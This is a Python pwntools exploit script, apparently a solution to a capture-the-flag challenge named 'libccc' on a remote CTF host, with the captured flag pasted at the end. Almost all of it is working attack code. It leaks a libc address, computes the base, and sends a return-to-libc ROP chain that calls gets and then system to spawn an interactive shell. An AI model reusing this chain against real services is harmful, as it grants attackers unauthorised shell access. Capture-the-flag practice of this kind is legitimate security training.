from pwn import *

p = remote('ctf.adl.tw', 11004)
# p = process('./libccc')
# elf = ELF('./libccc')
# libc = elf.libc
libc = ELF('libc.so.6')

_IO_2_1_stdin_ = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = _IO_2_1_stdin_ - 0x0000000003eba00
success('libc base = 0x%x', libc_base)
system = libc.sym['system'] + libc_base
gets = libc.sym['gets'] + libc_base
pop_rdi = libc_base + 0x000000000002155f
writable = libc_base + 0x3EE9F0

p.sendafter('string:', 'a'*64)
payload = b'a'*8 + p64(pop_rdi) + p64(writable) + p64(gets) + p64(pop_rdi) + p64(writable) + p64(system)
p.sendafter('another:', payload)
p.sendline('sh')

p.interactive()

'''
ADLCTF{li6c_so_6RE4T_WHY_d0N't_w3_5imply_Return_T0_1ibc?}
'''